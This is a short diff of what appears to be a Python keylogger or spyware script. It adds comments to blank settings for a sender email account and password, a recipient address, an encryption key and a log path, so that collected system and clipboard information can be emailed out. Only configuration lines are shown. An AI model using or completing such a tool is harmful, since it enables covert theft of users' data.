@@ -37,16 +37,16 @@ system_info_e = "e_system_info.txt"
 clipboard_info_e = "e_clipboard.txt"
 
 # Email account the information will be sent to
-emailAddress = " "
-password = " "
-toAddress = " "
+emailAddress = " "   # Email account the script will use to send
+password = " "       # Password for the emailAddress
+toAddress = " "      # Email account that the log files will be sent to
 
 username = getpass.getuser()
 
-crypt_key = str(" ")  # the encryption key
+crypt_key = str(" ") # the encryption key
 
 # File path the data variables will be stored into
-file_path = " "
+file_path = " "      # Path to save log files to
 extend = "\\"
 file_merge = file_path + extend
 
